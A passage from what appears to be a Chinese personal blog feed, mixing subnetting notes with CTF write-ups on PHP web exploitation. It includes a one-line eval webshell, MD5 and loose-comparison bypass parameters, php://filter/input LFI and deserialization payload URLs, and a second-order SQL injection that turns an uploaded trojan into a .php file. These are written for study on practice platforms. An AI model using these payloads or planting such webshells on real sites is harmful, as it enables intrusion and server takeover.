172.16.55.87，如何确定它的网络号?</p></blockquote><h2 id="Subnetting-Review-Exercise"><a href="#Subnetting-Review-Exercise" class="headerlink" title="Subnetting Review Exercise"></a>Subnetting Review Exercise</h2><p>Subnet a network with a private network address of 172.16.0.0/16 so that it provides 100 subnets and maximizes the number of host addresses for each subnet.</p><ul><li>How many bits will need to be borrowed?</li><li>What is the new subnet mask?</li></ul><ol><li>2的7次方 = 128 &gt; 100，向后借7位</li><li>172.16.0.0/23，把/16切成128个/23的</li></ol><h2 id="VLSM"><a href="#VLSM" class="headerlink" title="VLSM"></a>VLSM</h2><blockquote><p>按需分配，划分的子网刚刚满足需求</p></blockquote><p><strong>Example1：</strong></p><p>IP Address：192.168.221.37<br>Subnet Mask： /29</p><p>192.168.221.00100 | 101</p><p>后三位是主机位，属于192.168.221.32网段</p><p><strong>Example2：</strong><br><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/19.png" alt></p><ul><li>左半边 IP 地址需求为 2，右半边为 50，把子网切成能满足需求的小的子网</li><li>先满足较大的主机需求，50，那么主机部分留 6 位</li><li>10101100.100010000.0010 | 0000.00 | 000000，前 20 位是不变的，主机部分留 6 位，剩下的 6 位就是子网部分，切出来 64 个子网，将 /20 切为 64 个 /26 的子网</li><li>满足左边的主机需求只需要 2 个 IP 地址，主机位只要留2位即可</li><li>找一个剩下的 /26 子网切成 16 个 /30 的子网，每个子网有 2 个 IP 地址</li></ul><h2 id="Route-Summarization"><a href="#Route-Summarization" class="headerlink" title="Route Summarization"></a>Route Summarization</h2><p>路由匹配的特点：</p><ul><li>路由器只会匹配子网掩码规定的位数，剩下的不管</li><li>路由器进行的是最长匹配，永远优先匹配子网掩码最长的</li></ul><p>路由汇总： </p><p>B：172.16.128.0/20<br>C：172.16.32.0/24<br>D：172.16.64.0/20<br>BCD汇总成 172.16.0.0/16 发送给 A 路由器，再由 A 路由器发送给上层路由器</p><blockquote><p>针对路由表，减少路由表条目数量</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OSI模型&quot;&gt;&lt;a href=&quot;#OSI模型&quot; class=&quot;headerlink&quot; title=&quot;OSI模型&quot;&gt;&lt;/a&gt;OSI模型&lt;/h1&gt;&lt;h2 id=&quot;A-Layered-Network-Model&quot;&gt;&lt;a href=&quot;#A-Layered-Network-
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>总结</title>
    <link href="http://yoursite.com/2019/06/01/%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/06/01/一些总结/</id>
    <published>2019-05-31T18:37:38.582Z</published>
    <updated>2019-05-31T18:31:45.248Z</updated>
    
    <content type="html"><![CDATA[<p>最近也做了很多web的CTF题目，做一个小总结吧，以后继续更新。</p><h1 id="一、常识"><a href="#一、常识" class="headerlink" title="一、常识"></a>一、常识</h1><p>1.看到网站，先御剑扫描一波，robots.txt等文件</p><p>2.F12经常打开看一看，看注释，看网络，看存储</p><p>3.不要忘记burp</p><h1 id="二、PHP弱类型"><a href="#二、PHP弱类型" class="headerlink" title="二、PHP弱类型"></a>二、PHP弱类型</h1><p>1.在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true</p><p>2.bool类型的true跟任意字符串都可以弱类型相等</p><p>3.PHP支持引用赋值，使用” $var = &amp;$othervar; “语法。引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西，$var和$othervar就永远相等了，一般用在序列化中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="string">'a'</span> == <span class="number">0</span>)  <span class="comment">//true，a会被转化为数字0</span></span><br><span class="line">var_dump(<span class="string">'1234a'</span> == <span class="number">1234</span>)  <span class="comment">//true，这里'1234a'会被转化为1234</span></span><br><span class="line"><span class="comment">//在$a==$b的比较中</span></span><br><span class="line">$a=<span class="string">''</span>; $b=<span class="keyword">null</span>        <span class="comment">//true</span></span><br><span class="line">$a=<span class="keyword">null</span>; $b=<span class="keyword">true</span>      <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>; $b=<span class="string">'0'</span>       <span class="comment">//true</span></span><br><span class="line">$a=<span class="number">0</span>; $b=<span class="string">'abcdef'</span>  <span class="comment">//true  而 0==='abcdef' false</span></span><br></pre></td></tr></table></figure><h1 id="三、hash比较缺陷"><a href="#三、hash比较缺陷" class="headerlink" title="三、hash比较缺陷"></a>三、hash比较缺陷</h1><p>1.md5弱比较，以 0e 开头的会被识别为科学计数法，结果均为 0</p><p>2.md5强比较，传入数组绕过</p><p>3.基于全等的MD5碰撞绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//弱比较  param1=QNKCDZO&amp;param2=s155964671a</span></span><br><span class="line"><span class="keyword">if</span>(( $_POST[<span class="string">'param1'</span>]) != ($_POST[<span class="string">'param2'</span>]) &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) == md5($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"success !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//强比较，参数没有强制转化为字符串  param1[]=11&amp;param2[]=22</span></span><br><span class="line"><span class="keyword">if</span>(( $_POST[<span class="string">'param1'</span>]) !== ($_POST[<span class="string">'param2'</span>]) &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"success !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//基于全等的MD5碰撞  fastcoll，tail生成md5相同的文件</span></span><br><span class="line"><span class="comment">//https://peri0d.xyz/2019/04/23/JACTF-Web%E9%83%A8%E5%88%86.html</span></span><br><span class="line"><span class="keyword">if</span>((string)( $_POST[<span class="string">'param1'</span>]) !== (string)($_POST[<span class="string">'param2'</span>]) &amp;&amp; md5($_POST[<span class="string">'param1'</span>]) === md5($_POST[<span class="string">'param2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"success !"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="四、任意代码-任意命令执行"><a href="#四、任意代码-任意命令执行" class="headerlink" title="四、任意代码/任意命令执行"></a>四、任意代码/任意命令执行</h1><p>1.create_function()注入</p><p>2.eval()函数</p><p>3.assert()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//create_function() </span></span><br><span class="line"><span class="comment">//from JACTF-not easy</span></span><br><span class="line"><span class="comment">//https://peri0d.xyz/2019/04/23/JACTF-Web%E9%83%A8%E5%88%86.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">第一行代码等价于</span><br><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b); </span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>eval与assert都算是元老级一句话后门函数</p><p>eval函数中参数是字符，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span> <span class="comment">//一句话</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'echo 1;'</span>);</span><br></pre></td></tr></table></figure><p>assert函数中参数为表达式 （或者为函数），如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert(phpinfo());</span><br><span class="line">assert(<span class="keyword">eval</span>(<span class="string">'echo 1;'</span>));</span><br></pre></td></tr></table></figure><h1 id="五、文件包含-LFI"><a href="#五、文件包含-LFI" class="headerlink" title="五、文件包含(LFI)"></a>五、文件包含(LFI)</h1><p>1.php脚本使用了include，include_once，require，require_once这四个函数，并且函数的参数是用户可控的</p><p>2.通常include函数中，包含文件的后缀名时被限制的，如果php版本小于等于5.3，则可以%00截断</p><p>3.php伪协议助阵LFI</p><h1 id="六、序列化与反序列化"><a href="#六、序列化与反序列化" class="headerlink" title="六、序列化与反序列化"></a>六、序列化与反序列化</h1><p>1.__wakeup()</p><p>2.引用赋值，永远相等</p><p>ciscn2019—Justsooso</p><p>没有放到我的博客上</p><p>文档：JustSoso.note<br>链接：<a href="http://note.youdao.com/noteshare?id=dfeffdf87a2fcd81fe43f3f9bcd799c1" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=dfeffdf87a2fcd81fe43f3f9bcd799c1</a></p><h1 id="七、一个例子"><a href="#七、一个例子" class="headerlink" title="七、一个例子"></a>七、一个例子</h1><p>放一个题目，结合了<strong>文件包含</strong>和<strong>反序列化</strong></p><p>地址：<a href="http://123.206.87.240:8006/test1/" target="_blank" rel="noopener">http://123.206.87.240:8006/test1/</a></p><p>给了一个不完整的index.php代码</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_1.PNG" alt></p><p><strong>思路：</strong></p><p>isset($user)：user不能为空</p><p>file_get_contents($user,’r’)：将user文件的内容读入一个字符串中</p><p>很明显，user是一个文件，让这个字符串完全等于”welcome to the bugkuctf”——————-&gt;php伪协议php://input</p><p>hint.php：满足所有条件之后读取hint.php文件————————&gt;php://filter</p><p>payload:</p><p>txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</p><p>利用伪协议获得目标文件的base64密文</p><p>hint.php</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_2.PNG" alt></p><p>在生成一个Flag类对象时，执行__tostring函数，输出文件内容，那么屏蔽的flag.php可以在此处打开</p><p>index.php</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bugku/bugku_wel2bugku_3.PNG" alt></p><p>发现如果file中包含flag就会退出，如果不包含flag就会把那个文件包含进来，再执行一次反序列化，输出password</p><p>php序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file = <span class="string">"flag.php"</span>;</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$a = O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>最终payload</strong></p><p><a href="http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</a></p><p>POST数据为welcome to the bugkuctf</p><h1 id="八、我的一些想法"><a href="#八、我的一些想法" class="headerlink" title="八、我的一些想法"></a>八、我的一些想法</h1><p>对于web安全，我认为其本质就是fuzz，就是给一个输入根据输出判断代码的逻辑。通过fuzz来观察什么输入就正确的，什么输入是错误的，并根据返回的错误采用一些手段进行攻击。</p><p>对于web安全的学习，我认为是一个逆向的过程，不是说要把所有的东西学完再去进行攻击，而是直接进行攻击，在攻击的过程中去学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近也做了很多web的CTF题目，做一个小总结吧，以后继续更新。&lt;/p&gt;
&lt;h1 id=&quot;一、常识&quot;&gt;&lt;a href=&quot;#一、常识&quot; class=&quot;headerlink&quot; title=&quot;一、常识&quot;&gt;&lt;/a&gt;一、常识&lt;/h1&gt;&lt;p&gt;1.看到网站，先御剑扫描一波，robots.
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="技巧" scheme="http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>蓝鲸安全打卡Web分析</title>
    <link href="http://yoursite.com/2019/06/01/%E8%93%9D%E9%B2%B8%E6%89%93%E5%8D%A1Web%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/06/01/蓝鲸打卡Web分析/</id>
    <published>2019-05-31T18:37:38.581Z</published>
    <updated>2019-05-31T18:30:46.532Z</updated>
    
    <content type="html"><![CDATA[<p>平台gg了，以后再继续写</p><h2 id="一、蓝鲸文件管理系统"><a href="#一、蓝鲸文件管理系统" class="headerlink" title="一、蓝鲸文件管理系统"></a>一、蓝鲸文件管理系统</h2><p>源代码地址：<a href="http://www.whaledu.com/course/290/task/2848/show" target="_blank" rel="noopener">http://www.whaledu.com/course/290/task/2848/show</a></p><p>首先在设置文件里把所有的输入都采用<strong>addslashes()</strong>函数进行转义</p><h3 id="upload-php关键代码"><a href="#upload-php关键代码" class="headerlink" title="upload.php关键代码"></a>upload.php关键代码</h3><p>将上传的文件通过pathinfo()函数分成三个部分，[dirname] [filename] [extension]</p><p>然后进行后缀名检查，拼接后进行addslashes转义，查询是否存在这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line"></span><br><span class="line">    $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">   </span><br><span class="line">    $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">    $fetch = $db-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将文件名和后缀名插入数据库，将文件移动到相应文件夹并返回路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">        $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">        $re = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="rename-php关键代码"><a href="#rename-php关键代码" class="headerlink" title="rename.php关键代码"></a>rename.php关键代码</h3><p>查询旧文件是否存在</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>更新filename，将oldname和newname重组，查询oldname是否存在，然后将文件的oldname更新为newname</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($result) &#123;       </span><br><span class="line"></span><br><span class="line">    $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">    $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">        print_r($db-&gt;errorInfo());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">    $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">    <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">        rename($oldname, $newname);</span><br><span class="line">        $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">            &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>在upload的过程中，全程进行转义并检测后缀，无法对上传进行操作，但是在rename的时候，没有对newname进行控制，这就可能会造成update的二次注入。</p><p>假设我们上传的文件是 1.jpg，然后进行改名，这个时候就会触发数据库的update语句</p><blockquote><p>update `file` set `filename`=’newname’, `oldname`=’1’ where `fid`=fid</p></blockquote><p>很明显，这里的newname和oldname都是我们可以控制的。</p><p>考虑上传问题，假设 1.jpg 是一句话木马，要把 1.jpg 变成 1.php，由于filename和extension分开操作，然后再合并，所有这里希望extension为空，这样在rename时可以将 1.jpg 变成 1.php。</p><p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.php，发现结果为 1.php.jpg</p><p><strong>解释：</strong></p><p>文件 ‘,extension=’’,filename=’1.jpg.jpg 上传后的数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_1.PNG" alt></p><p>注意，rename过程中进行查询时，查询的结果 result[‘fid’] = 1，result[‘extension’] = ‘jpg’</p><p>然后进行update，这时执行了构造的SQL语句，数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_2.PNG" alt></p><p>注意这两行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">$newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br></pre></td></tr></table></figure><p>在这个过程中，oldname=’,extension=’’,filename=’1.jpg.jpg，newname=1.php.jpg，由于oldname存在，所以最后变成1.php.jpg</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>构造文件 ‘,extension=’’,filename=’1.jpg.jpg，上传，进行rename为 1.jpg，结果为 <strong>1.jpg.jpg</strong></p><p>构造另外一个一句话木马文件1.jpg，上传，数据库如下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/bluewhale/whalectf_web1_3.PNG" alt></p><p>再进行rename，传入的oldname为 1.jpg，newname为 1.php</p><p>进行查询的结果为 result[‘fid’] = 1，result[‘extension’] = ‘’</p><p>在最后的过程中，oldname = 1.jpg，newname = 1.php，这样就把上传的 1.jpg 变成了 1.php</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平台gg了，以后再继续写&lt;/p&gt;
&lt;h2 id=&quot;一、蓝鲸文件管理系统&quot;&gt;&lt;a href=&quot;#一、蓝鲸文件管理系统&quot; class=&quot;headerlink&quot; title=&quot;一、蓝鲸文件管理系统&quot;&gt;&lt;/a&gt;一、蓝鲸文件管理系统&lt;/h2&gt;&lt;p&gt;源代码地址：&lt;a href=&quot;htt
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="whale CTF" scheme="http://yoursite.com/tags/whale-CTF/"/>
    
  </entry>
  
  <entry>
    <title>XCTF Web新手</title>
    <link href="http://yoursite.com/2019/06/01/XCTF-Web%E6%96%B0%E6%89%8B/"/>
    <id>http://yoursite.com/2019/06/01/XCTF-Web新手/</id>
    <published>2019-05-31T18:37:38.580Z</published>
    <updated>2019-05-31T18:32:40.526Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="view-source"><a href="#view-source" class="headerlink" title="view source"></a>view source</h3><p>禁用右键，F12审查元素</p><h3 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h3><p>hackbar进行post</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_1.PNG" alt></p><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><p>直接访问robots.txt，发现f1ag_1s_h3re.ph文件，直接访问</p><h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>备份文件一般是在后缀名后加.swp，.bak</p><p>本题尝试index.php.bak成功获取源码</p><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>burp抓包，发现提示，查看cookie.php，在响应头发现flag</p><p>火狐，F12，网络，cookie可以看到提示，访问之后再看响应头即可</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_2.PNG" alt></p><h3 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h3><p>F12审查元素，找到按钮对应的代码，发现<strong>disabled=””</strong>，具体属性可以查看w3school，删除这个属性即可。</p><h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>拿到js源码，根据分析可以知道，函数dechiffre(pass_enc)的返回值与传入参数无关</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_3.PNG" alt></p><p>根据<code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code>，替换\x为%，再URLdecode一下，得到<code>55,56,54,79,115,69,114,116,107,49,50</code>，Firefox控制台运行一下</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_4.PNG" alt></p><h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>burp改包</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_5.PNG" alt></p><h3 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h3><p>审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可。但是这里我直接尝试admin，123456就登陆了，弱密码。</p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>直接使用蚁剑</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_6.PNG" alt></p><h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>关于命令执行，windows或linux下: </p><p>command1 &amp;&amp; command2 先执行command1后执行command2</p><p>command1 | command2 只执行command2 </p><p>command1 &amp; command2 先执行command2后执行command1</p><p>本题先使用ls不断遍历目录，查找flag，最后再读取</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_new_7.PNG" alt></p><h3 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h3><p>看到源码，考察php弱类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 